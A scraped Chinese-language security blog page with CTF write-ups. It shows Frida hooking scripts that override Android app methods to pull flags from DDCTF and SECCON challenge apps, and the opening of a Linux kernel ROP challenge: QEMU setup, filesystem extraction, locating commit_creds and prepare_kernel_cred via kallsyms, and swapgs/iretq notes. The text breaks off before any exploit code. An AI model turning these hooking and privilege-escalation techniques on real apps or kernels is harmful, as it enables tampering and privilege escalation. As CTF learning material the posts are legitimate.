ConstructorParam =Java.array(<span class="string">&apos;Ljava.lang.Object;&apos;</span>,[objectclass.class]);</span><br><span class="line">                <span class="keyword">var</span> Constructor = hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Constructor:&quot;</span>+Constructor);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;orinin:&quot;</span>+mainAc);</span><br><span class="line">                <span class="keyword">var</span> instance = Constructor.newInstance([mainAc]);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;patchAc:&quot;</span>+instance);</span><br><span class="line">                send(instance);</span><br><span class="line"> </span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;-----------------------------GET Methods----------------------------&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> func = hookClassCast.getDeclaredMethods();</span><br><span class="line">                <span class="built_in">console</span>.log(func);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;--------------------------GET Joseph Function---------------------------&quot;</span>);</span><br><span class="line">                <span class="built_in">console</span>.log(func[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">var</span> f = func[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">var</span> num1 = Integerclass.$<span class="keyword">new</span>(<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">var</span> num2 = Integerclass.$<span class="keyword">new</span>(<span class="number">6</span>);</span><br><span class="line">                <span class="keyword">var</span> numArr1 = Java.array(<span class="string">&apos;Ljava.lang.Object;&apos;</span>,[num1,num2]);</span><br><span class="line">                <span class="keyword">var</span> num3 = Integerclass.$<span class="keyword">new</span>(<span class="number">7</span>);</span><br><span class="line">                <span class="keyword">var</span> num4 = Integerclass.$<span class="keyword">new</span>(<span class="number">8</span>);</span><br><span class="line">                <span class="keyword">var</span> numArr2 = Java.array(<span class="string">&apos;Ljava.lang.Object;&apos;</span>,[num3,num4]);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;-----------------------------GET Array------------------------------&quot;</span>);</span><br><span class="line">                <span class="built_in">console</span>.log(numArr1);</span><br><span class="line">                <span class="built_in">console</span>.log(numArr2);</span><br><span class="line">                <span class="keyword">var</span> rtn1 = f.invoke(instance,numArr1);</span><br><span class="line">                <span class="keyword">var</span> rtn2 = f.invoke(instance,numArr2);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;--------------------------------FLAG---------------------------------&quot;</span>);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;DDCTF{&quot;</span>+rtn1+rtn2+<span class="string">&quot;}&quot;</span>);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;--------------------------------OVER--------------------------------&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line"> </span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        }</span><br><span class="line">});</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/06/frida使用/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Po1lux">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/IMG.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Po1lux's Diary">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/11/06/frida使用/" itemprop="url">frida-notebook</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-06T15:05:33+08:00">
                2019-11-06
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/11/06/frida使用/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/11/06/frida使用/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2019/11/06/frida使用/" class="leancloud_visitors" data-flag-title="frida-notebook">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="1&#x3001;hook&#x51FD;&#x6570;&#xFF0C;&#x83B7;&#x53D6;java&#x5C42;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;"><a href="#1&#x3001;hook&#x51FD;&#x6570;&#xFF0C;&#x83B7;&#x53D6;java&#x5C42;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;" class="headerlink" title="1&#x3001;hook&#x51FD;&#x6570;&#xFF0C;&#x83B7;&#x53D6;java&#x5C42;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;"></a>1&#x3001;hook&#x51FD;&#x6570;&#xFF0C;&#x83B7;&#x53D6;java&#x5C42;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="number">1000</span> == MainActivity.<span class="keyword">this</span>.cnt) {</span><br><span class="line">    tv3.setText(<span class="string">&quot;SECCON{&quot;</span> + String.valueOf((MainActivity.<span class="keyword">this</span>.cnt + MainActivity.<span class="keyword">this</span>.calc()) * <span class="number">107</span>) + <span class="string">&quot;}&quot;</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>calc&#x4E3A;native&#x5C42;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;hook onCreate&#x65B9;&#x6CD5;&#xFF0C;&#x91CD;&#x65B0;&#x5B9E;&#x73B0;onCreate&#x65B9;&#x6CD5;&#xFF0C;&#x8C03;&#x7528;calc&#x65B9;&#x6CD5;&#xFF0C;&#x83B7;&#x5F97;&#x8FD4;&#x56DE;&#x503C;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Java.Perform &#x5F00;&#x59CB;&#x6267;&#x884C;JavaScript&#x811A;&#x672C;&#x3002;</span></span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>{</span><br><span class="line">    <span class="keyword">var</span> MainActivity = Java.use(<span class="string">&apos;com.example.seccon2015.rock_paper_scissors.MainActivity&apos;</span>);</span><br><span class="line">    MainActivity.onCreate.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">var</span> returnValue = <span class="keyword">this</span>.calc();<span class="comment">//&#x8C03;&#x7528;MainActivity.calc()</span></span><br><span class="line">        send(<span class="string">&quot;Return:&quot;</span>+returnValue);</span><br><span class="line">        <span class="keyword">var</span> result = (<span class="number">1000</span>+returnValue)*<span class="number">107</span>;</span><br><span class="line">        send(<span class="string">&quot;Flag:&quot;</span>+<span class="string">&quot;SECCON{&quot;</span>+result.toString()+<span class="string">&quot;}&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">});</span><br></pre></td></tr></table></figure>
<h2 id="2&#x3001;hook&#x51FD;&#x6570;&#xFF0C;&#x4FEE;&#x6539;java&#x5C42;&#x53D8;&#x91CF;&#x7684;&#x503C;"><a href="#2&#x3001;hook&#x51FD;&#x6570;&#xFF0C;&#x4FEE;&#x6539;java&#x5C42;&#x53D8;&#x91CF;&#x7684;&#x503C;" class="headerlink" title="2&#x3001;hook&#x51FD;&#x6570;&#xFF0C;&#x4FEE;&#x6539;java&#x5C42;&#x53D8;&#x91CF;&#x7684;&#x503C;"></a>2&#x3001;hook&#x51FD;&#x6570;&#xFF0C;&#x4FEE;&#x6539;java&#x5C42;&#x53D8;&#x91CF;&#x7684;&#x503C;</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function () {</span><br><span class="line">    var MainActivity = Java.use(<span class="string">&apos;com.example.seccon2015.rock_paper_scissors.MainActivity&apos;</span>);</span><br><span class="line">    <span class="comment">//hook onClick&#x65B9;&#x6CD5;&#xFF0C;&#x6B64;&#x5904;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;onClick&#x65B9;&#x6CD5;&#x662F;&#x4F20;&#x9012;&#x4E86;&#x4E00;&#x4E2A;View&#x53C2;&#x6570;v</span></span><br><span class="line">    MainActivity.onClick.implementation = function (v) {</span><br><span class="line">        <span class="comment">//&#x8C03;&#x7528;onClick,&#x6A21;&#x62DF;&#x70B9;&#x51FB;&#x4E8B;&#x4EF6;</span></span><br><span class="line">        <span class="keyword">this</span>.onClick(v);</span><br><span class="line">        <span class="keyword">this</span>.n.value = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.m.value = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">this</span>.cnt.value = <span class="number">999</span>;</span><br><span class="line">        send(<span class="string">&quot;Success!&quot;</span>)</span><br><span class="line">    }</span><br><span class="line">});</span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">adb</span> <span class="selector-tag">forward</span> <span class="selector-tag">tcp</span><span class="selector-pseudo">:27042</span> <span class="selector-tag">tcp</span><span class="selector-pseudo">:27042</span></span><br><span class="line"><span class="selector-tag">adb</span> <span class="selector-tag">forward</span> <span class="selector-tag">tcp</span><span class="selector-pseudo">:27043</span> <span class="selector-tag">tcp</span><span class="selector-pseudo">:27043</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> boolean_clz = Java.<span class="keyword">use</span>(<span class="string">&quot;java.lang.Boolean&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> ret = boolean_clz.valueOf(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">frida</span> -U -f app&#x5B8C;&#x6574;&#x540D;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/04/Linux-Kernel-ROP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Po1lux">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/IMG.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Po1lux's Diary">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/11/04/Linux-Kernel-ROP/" itemprop="url">Linux Kernel ROP</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-04T13:51:02+08:00">
                2019-11-04
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/11/04/Linux-Kernel-ROP/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/11/04/Linux-Kernel-ROP/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2019/11/04/Linux-Kernel-ROP/" class="leancloud_visitors" data-flag-title="Linux Kernel ROP">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x662F;&#x5185;&#x6838;&#x7A7A;&#x95F4;&#x7684;&#x6808;&#x6EA2;&#x51FA;&#xFF0C;&#x5173;&#x4E8E;&#x5185;&#x6838;&#x6A21;&#x5757;&#x7684;&#x6F0F;&#x6D1E;&#x7F51;&#x4E0A;&#x6709;&#x5F88;&#x591A;&#x5206;&#x6790;&#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x6211;&#x6253;&#x7B97;&#x53EA;&#x8BF4;&#x4E0B;&#x81EA;&#x5DF1;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x83B7;&#x5F97;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x5728;&#x6B64;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;</p>
<h2 id="Load-CTF-Files-to-QEMU"><a href="#Load-CTF-Files-to-QEMU" class="headerlink" title="Load CTF Files to QEMU"></a>Load CTF Files to QEMU</h2><p>CTF files&#x5305;&#x542B;&#x4E86;4&#x4E2A;&#x6587;&#x4EF6;</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x251C;&#x2500;&#x2500; bzImage</span><br><span class="line">&#x251C;&#x2500;&#x2500; core.cpio</span><br><span class="line">&#x251C;&#x2500;&#x2500; start.sh</span><br><span class="line">&#x2514;&#x2500;&#x2500; vmlinux</span><br></pre></td></tr></table></figure>
<p>start.sh&#x662F;&#x7CFB;&#x7EDF;&#x7684;&#x542F;&#x52A8;&#x811A;&#x672C;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5F00;&#x542F;&#x4E86;kaslr</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>
<ul>
<li>qemu-system-x86_64&#xFF1A;&#x6A21;&#x62DF;x86_64&#x67B6;&#x6784;</li>
<li>-m&#xFF1A;&#x6307;&#x5B9A;RAM&#x5927;&#x5C0F;</li>
<li>-kernel&#xFF1A;&#x52A0;&#x8F7D;&#x7684;&#x5185;&#x6838;&#x955C;&#x50CF;</li>
<li>-initrd&#xFF1A;&#x6307;&#x5B9A;&#x5185;&#x6838;&#x542F;&#x52A8;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;</li>
<li>-s&#xFF1A;&#x76F8;&#x5F53;&#x4E8E; -gdb tcp::1234&#xFF0C;&#x7ED1;&#x5B9A;&#x7AEF;&#x53E3;&#xFF0C;&#x4F7F;&#x7528;gdb&#x8C03;&#x8BD5;</li>
</ul>
<p>&#x8FD8;&#x63D0;&#x4F9B;&#x4E86;vmlinux&#xFF0C;&#x8FD9;&#x91CC;&#x8BF4;&#x4E0B;vmlinux&#x548C;bzImage&#x7684;&#x5173;&#x7CFB;<a href="http://www.linfo.org/vmlinuz.html" target="_blank" rel="noopener">refference</a></p>
<blockquote>
<p>vmlinux&#x662F;&#x672A;&#x538B;&#x7F29;&#x7684;&#x3001;&#x9759;&#x6001;&#x94FE;&#x63A5;&#x7684;&#x3001;&#x53EF;&#x6267;&#x884C;&#x7684;&#x3001;&#x4F46;&#x662F;&#x4E0D;&#x80FD;bootable&#x7684;&#x5185;&#x6838;&#x6587;&#x4EF6;<br>vmlinuz&#x662F;&#x7531;vmlinux&#x7ECF;&#x8FC7;&#x538B;&#x7F29;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;bootable&#x7684;&#x5185;&#x6838;&#x6587;&#x4EF6;&#xFF0C;&#x5B83;&#x5B9E;&#x9645;&#x4E0A;&#x5C31;&#x662F;<code>zImage</code>&#x6216;bzImage<br>bzImage&#x662F;vmlinuz&#x7ECF;&#x8FC7;gzip&#x538B;&#x7F29;&#x540E;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x9002;&#x7528;&#x4E8E;&#x5927;&#x5185;&#x6838;<br>zImage&#x662F;vmlinuz&#x7ECF;&#x8FC7;gzip&#x538B;&#x7F29;&#x540E;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x9002;&#x7528;&#x4E8E;<code>640k</code>&#x5185;&#x5B58;&#x7684;&#x5C0F;&#x5185;&#x6838;</p>
</blockquote>
<p>&#x4F46;&#x662F;&#x9898;&#x76EE;&#x63D0;&#x4F9B;&#x7684;vmlinux&#x548C;&#x5185;&#x6838;&#x4F7F;&#x7528;&#x7684;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x4ECE;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x63D0;&#x53D6;&#x6587;&#x4EF6;</p>
<h3 id="&#x63D0;&#x53D6;cpio&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6587;&#x4EF6;"><a href="#&#x63D0;&#x53D6;cpio&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6587;&#x4EF6;" class="headerlink" title="&#x63D0;&#x53D6;cpio&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6587;&#x4EF6;"></a>&#x63D0;&#x53D6;cpio&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6587;&#x4EF6;</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mkdir core</span><br><span class="line">mv core.cpio ./core/core.cpio.gz</span><br><span class="line">gunzip core.cpio.gz</span><br><span class="line">cpio -idmv &lt; core.cpio</span><br><span class="line">&#x251C;&#x2500;&#x2500; bin</span><br><span class="line">&#x251C;&#x2500;&#x2500; core.ko</span><br><span class="line">&#x251C;&#x2500;&#x2500; etc</span><br><span class="line">&#x251C;&#x2500;&#x2500; exploit</span><br><span class="line">&#x251C;&#x2500;&#x2500; gen_cpio.sh</span><br><span class="line">&#x251C;&#x2500;&#x2500; init</span><br><span class="line">&#x251C;&#x2500;&#x2500; lib</span><br><span class="line">&#x251C;&#x2500;&#x2500; lib64</span><br><span class="line">&#x251C;&#x2500;&#x2500; linuxrc -&gt; bin/busybox</span><br><span class="line">&#x251C;&#x2500;&#x2500; proc</span><br><span class="line">&#x251C;&#x2500;&#x2500; root</span><br><span class="line">&#x251C;&#x2500;&#x2500; sbin</span><br><span class="line">&#x251C;&#x2500;&#x2500; sys</span><br><span class="line">&#x251C;&#x2500;&#x2500; tmp</span><br><span class="line">&#x251C;&#x2500;&#x2500; usr</span><br><span class="line">&#x2514;&#x2500;&#x2500; vmlinux</span><br><span class="line">&#x91CD;&#x6253;&#x5305;&#xFF1A;</span><br><span class="line">./gen_cpio.sh core.cpio</span><br></pre></td></tr></table></figure>
<p>vmlinux&#x662F;&#x672A;&#x538B;&#x7F29;&#x7684;&#x5185;&#x6838;&#x6587;&#x4EF6;&#xFF0C;&#x53EF;&#x4EE5;&#x4ECE;&#x8FD9;&#x91CC;&#x627E;Gadgets<br>core.ko&#x5C31;&#x662F;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#x7684;&#x5185;&#x6838;&#x6A21;&#x5757;<br>init&#x662F;&#x542F;&#x52A8;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line"><span class="comment">#poweroff -d 120 -f &amp;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&apos;sh end!\n&apos;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p>poweroff -d 120 -f &amp; &#x8BBE;&#x7F6E;&#x4E86;&#x5B9A;&#x65F6;&#x5173;&#x673A;&#xFF0C;&#x5F71;&#x54CD;&#x8C03;&#x8BD5;&#xFF0C;&#x9700;&#x8981;&#x6CE8;&#x91CA;&#x6389;<br><code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code> &#x9650;&#x5236;&#x4E0D;&#x80FD;&#x4ECE; <code>/pro/kallsyms</code> &#x83B7;&#x53D6;&#x5185;&#x6838;&#x7B26;&#x53F7;&#x8868;&#x4FE1;&#x606F;</p>
<blockquote>
<p>/proc/kallsyms&#x5305;&#x542B;&#x4E86;kernel image&#x548C;&#x6240;&#x6709;&#x52A8;&#x6001;&#x52A0;&#x8F7D;&#x6A21;&#x5757;&#x7684;&#x7B26;&#x53F7;&#x8868;&#x3002;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x88AB;&#x7F16;&#x8BD1;&#x5668;&#x5185;&#x8054;&#xFF08;inline&#xFF09;&#x6216;&#x8005;&#x4F18;&#x5316;&#x6389;&#x4E86;&#xFF0C;&#x5219;&#x5B83;&#x5728;/proc/kallsyms&#x6709;&#x53EF;&#x80FD;&#x627E;&#x4E0D;&#x5230;&#x3002;&#x6B64;&#x5916;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x662F;root&#x7528;&#x6237;&#xFF0C;&#x5219;&#x663E;&#x793A;/proc/kallsyms&#x4E2D;&#x7684;&#x5730;&#x5740;&#x90FD;&#x662F;0&#xFF1A;</p>
</blockquote>
<p>&#x4F46;&#x662F;<code>cat /proc/kallsyms &gt; /tmp/kallsyms</code> &#x8FD9;&#x53E5;&#xFF0C;&#x5C06;kallsyms&#x62F7;&#x8D1D;&#x4E86;&#x4E00;&#x4EFD;&#x5728;/tmp&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x8FD9;&#x91CC;&#x67E5;&#x627E;commit_creds&#x548C;prepare_kernel_cred&#x7684;&#x5730;&#x5740;</p>
<h2 id="Privilege-Transfer"><a href="#Privilege-Transfer" class="headerlink" title="Privilege Transfer"></a>Privilege Transfer</h2><p>Since userspace and kernel space are in different memory segment with different permission, we need some instructions to switch the spaces.</p>
<p>To switch from userspace to kernel space, we need to use syscall. To switch back&#xFF0C;we need to use two instructions as blew.</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">swapgs</span></span><br><span class="line"><span class="keyword">iretq</span></span><br></pre></td></tr></table></figure>
<p>The typical use of SWAPGS is to keep the &#x2018;user&#x2019; GS (which likely has a base address of 0) in the GSBase MSR, and the address of the kernel&#x2019;s per-CPU structure in KernelGSBase. Upon entry to Ring 0 (through a system call, software interrupt, or some other method), the kernel will use SWAPGS so accessing <code>[GS:0]</code> will get the pointer to the kernel data. Upon leaving Ring 0, SWAPGS will be called again, to switch GS back to the &#x2018;user&#x2019; GS. <a href="https://wiki.osdev.org/SWAPGS" target="_blank" rel="noopener">refference</a></p>
<p>Iretq instruction recovery the context of userspace, thus we come back from kernelspace to userspace. Before use this instruction,some value should be stored in the stack, and the stack construction as blew.</p>
<p>&#x5F53;&#x4F7F;&#x7528;IRET&#x6307;&#x4EE4;&#x8FD4;&#x56DE;&#x5230;&#x76F8;&#x540C;&#x4FDD;&#x62A4;&#x7EA7;&#x522B;&#x7684;&#x4EFB;&#x52A1;&#x65F6;&#xFF0C;IRET&#x4F1A;&#x4ECE;&#x6808;&#x5C06;<code>&#x8FD4;&#x56DE;&#x6307;&#x4EE4;&#x6307;&#x9488;</code>&#x3001;<code>&#x8FD4;&#x56DE;&#x4EE3;&#x7801;&#x6BB5;&#x9009;&#x62E9;&#x5668;</code>&#x4EE5;&#x53CA;<code>EFLAGS&#x6620;&#x50CF;</code>&#x5206;&#x522B;&#x5F39;&#x5165;RIP&#x3001;CS&#x4EE5;&#x53CA;RFLAGS&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x7136;&#x540E;&#x6062;&#x590D;&#x6267;&#x884C;&#x4E2D;&#x65AD;&#x7684;&#x7A0B;&#x5E8F;&#x6216;&#x8FC7;&#x7A0B;&#x3002;<br>&#x5F53;&#x4F7F;&#x7528;IRET&#x6307;&#x4EE4;&#x8FD4;&#x56DE;&#x5230;&#x4E0D;&#x540C;&#x4FDD;&#x62A4;&#x7EA7;&#x522B;&#x65F6;&#xFF0C;IRET&#x4E0D;&#x4EC5;&#x4F1A;&#x4ECE;&#x6808;&#x5F39;&#x51FA;&#x4EE5;&#x4E0A;&#x5185;&#x5BB9;&#xFF0C;&#x8FD8;&#x4F1A;&#x5F39;&#x51FA;<code>RSP</code>&#x4EE5;&#x53CA;<code>SS</code>&#x3002;</p>
<p>&#x6808;&#x4E0A;&#x4FDD;&#x5B58;&#x4E86;trap frame&#xFF0C;&#x8FD4;&#x56DE;&#x5230;&#x7528;&#x6237;&#x6A21;&#x5F0F;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6062;&#x590D;&#x4FE1;&#x606F;&#x4ECE;&#x4EE5;&#x4E0B;&#x7ED3;&#x6784;&#x4E2D;&#x8BFB;&#x53D6;&#xFF1A;</p>
